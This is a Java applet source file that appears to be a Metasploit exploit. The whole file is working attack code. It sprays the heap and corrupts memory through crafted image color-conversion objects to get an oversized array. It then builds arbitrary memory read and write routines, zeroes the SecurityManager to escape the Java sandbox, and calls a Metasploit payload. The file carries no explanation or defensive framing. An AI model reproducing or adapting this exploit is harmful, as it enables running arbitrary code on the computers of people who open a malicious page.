import java.applet.Applet;
import java.awt.color.ColorSpace;
import java.awt.image.BufferedImage;
import java.awt.image.ColorConvertOp;
import java.awt.image.ColorModel;
import java.awt.image.ComponentColorModel;
import java.awt.image.ComponentSampleModel;
import java.awt.image.SampleModel;
import metasploit.Payload;

public class Init extends Applet {

    private static final long serialVersionUID = 1L;
    static final int ARRAY_MAGIC = -1341411317;
    static final int ARRAY_OLDSIZE = 11;
    static final int ARRAY_NEWSIZE = 2147483647;
    static final int LEAK_MAGIC = -559035650;
    static final int SPRAY_ARRAY_COUNT = 2808685;
    static final int SPRAY_LEAK_COUNT = 2000000;
    volatile Leak[] _sleaks;
    volatile int[][] _sarrays;
    volatile int[] _bigArray;
    int[] _memBaseObj;
    long _memBaseIdx;
    long _memBasePtr;
    int[] soffsets;
    int[] doffsets;
  
  
    public Init()
    {
        this.soffsets = new int[] { 0, 1, 2, 3 };
        this.doffsets = new int[] { 0, 1, 2, 50000000 };
    }

    void spray() throws Exception
    {
        Runtime.getRuntime().gc();
        Runtime.getRuntime().gc();

        this._sleaks = new Leak[2000000];
        this._sarrays = new int[2808685][];
        try
        {
            for (int i = 0; i < this._sarrays.length; i++) {
                this._sarrays[i] = new int[11];
                for (int j = 0; j < this._sarrays[i].length; j++) {
                    this._sarrays[i][j] = -1341411317;
                }
            }

            for (int i = 0; i < this._sleaks.length; i++)
                this._sleaks[i] = new Leak("L");
        }
        catch (OutOfMemoryError localOutOfMemoryError)
        {
        }
    }

    void getBigArray() throws Exception
    {
        for (int i = 0; i < this._sarrays.length; i++) {
            for (int j = 0; (j < this._sarrays[i].length) && (j < 11); j++) {
                this._sarrays[i][j] = -1341411317;
            }
        }

        for (int i = 0; i < this._sarrays.length; i++) {
            if (this._sarrays[i].length != 2147483647) {
                for (int j = 0; (j < this._sarrays[i].length) && (j < 22); j++) {
                    if ((j > 0) && (this._sarrays[i][(j - 1)] != -1341411317) && (this._sarrays[i][j] == -1341411317)) {
                        this._sarrays[i][(j - 1)] = 2147483647;
                    }
                }
            }
        }

        for (int i = 0; i < this._sarrays.length; i++) {
            if ((this._sarrays[i].length == 11) || (this._bigArray != null) || (this._sarrays[i].length != 2147483647))
                continue;
            this._bigArray = this._sarrays[i];
        }

        if (this._bigArray == null)
            throw new Exception("fail");
    }

    long getAddress(Object obj) throws Exception
    {
        for (int i = 0; i < this._bigArray.length; i++) {
            if (this._bigArray[i] == -559035650) {
                int flag = 0;

                for (int j = 0; j < this._sleaks.length; j++) this._sleaks[j].obj = null;
                    flag += (this._bigArray[(i + 1)] == 0 ? 1 : 0);

                for (int j = 0; j < this._sleaks.length; j++) this._sleaks[j].obj = "X";
                    flag += (this._bigArray[(i + 1)] != 0 ? 1 : 0);

                if (flag == 2) {
                    for (int j = 0; j < this._sleaks.length; j++) this._sleaks[j].obj = obj;
                        return this._bigArray[(i + 1)];
                }
            }
        }

        throw new Exception("fail");
    }

    void getMemBase() throws Exception
    {
        for (int i = 0; i < this._sarrays.length; i++) {
            for (int j = 0; (j < this._sarrays[i].length) && (j < 11); j++) {
                this._sarrays[i][j] = (j == 1 ? i : -1341411317);
            }
        }

        for (int i = 0; i < this._bigArray.length; i++) {
            if ((i > 0) && (this._bigArray[(i - 1)] != -1341411317) && (this._bigArray[i] == -1341411317) && (this._bigArray[(i + 1)] != -1341411317)) {
                int len = this._bigArray[(i - 1)];
                int idx = this._bigArray[(i + 1)];
                if ((idx >= 0) && (idx < this._sarrays.length) && (this._sarrays[idx] != null) && (this._sarrays[idx].length == len)) {
                    this._memBaseObj = this._sarrays[idx];
                    this._memBaseIdx = i;
                    break;
                }
            }
        }

        if (this._memBaseObj == null) {
            throw new Exception("fail");
        }

        this._memBasePtr = getAddress(this._memBaseObj);

        if (this._memBasePtr == 0L) {
            throw new Exception("fail");
        }

        this._memBasePtr += 12L;
    }

    int rdMem(long addr)
    {
        long offs = this._memBaseIdx + (addr - this._memBasePtr) / 4L;
        if ((offs >= 0L) && (offs < 2147483647L)) {
            return this._bigArray[(int)offs];
        }
        return 0;
    }

    void wrMem(long addr, int value)
    {
        long offs = this._memBaseIdx + (addr - this._memBasePtr) / 4L;
        if ((offs >= 0L) && (offs < 2147483647L))
            this._bigArray[(int)offs] = value;
    }

    void privileged()
    {
        try
        {
            Payload.main(null);
        } catch (Exception localException) {
            //localException.printStackTrace();
        }
    }

  
    public void init()
    {
        try
        {
            if (System.getSecurityManager() == null) {
                privileged();
                return;
            }

            int sWidth = 168; int sHeight = 1;
            int spStride = 4; int ssStride = spStride * sWidth;

            int dWidth = sWidth; int dHeight = sHeight;
            int dpStride = 1; int dsStride = 0;

            ColorSpace scs = new MyColorSpace(0, this.soffsets.length - 1);
            ColorModel scm = new ComponentColorModel(scs, true, false, 1, 0);
            SampleModel ssm = new ComponentSampleModel(0, sWidth, sHeight, spStride, ssStride, this.soffsets);
            BufferedImage sbi = new MyBufferedImage(sWidth, sHeight, 6, 0, scm, ssm);

            for (int i = 0; i < ssStride; i++) {
                sbi.getRaster().getDataBuffer().setElem(i, 1);
            }

            ColorSpace dcs = new MyColorSpace(0, this.doffsets.length - 1);
            ColorModel dcm = new ComponentColorModel(dcs, true, false, 1, 0);
            SampleModel dsm = new ComponentSampleModel(0, dWidth, dHeight, dpStride, dsStride, this.doffsets);
            BufferedImage dbi = new MyBufferedImage(sWidth, sHeight, 10, 0, dcm, dsm);

            ColorConvertOp cco = new ColorConvertOp(null);

            spray();
            try
            {
                cco.filter(sbi, dbi);
            }
            catch (Exception localException) { }
            getBigArray();

            getMemBase();

            long sys = getAddress(System.class);
            long sm = getAddress(System.getSecurityManager());
            sys = rdMem(sys + 4L);
            for (int i = 0; i < 2000000; i++) {
                long addr = sys + i * 4;
                int val = rdMem(addr);
                if (val == sm) {
                    wrMem(addr, 0);
                    if (System.getSecurityManager() == null) {
                        break;
                    }
                }
            }
            privileged();
        }
        catch (Exception localException1)
        {
        }
    }


}
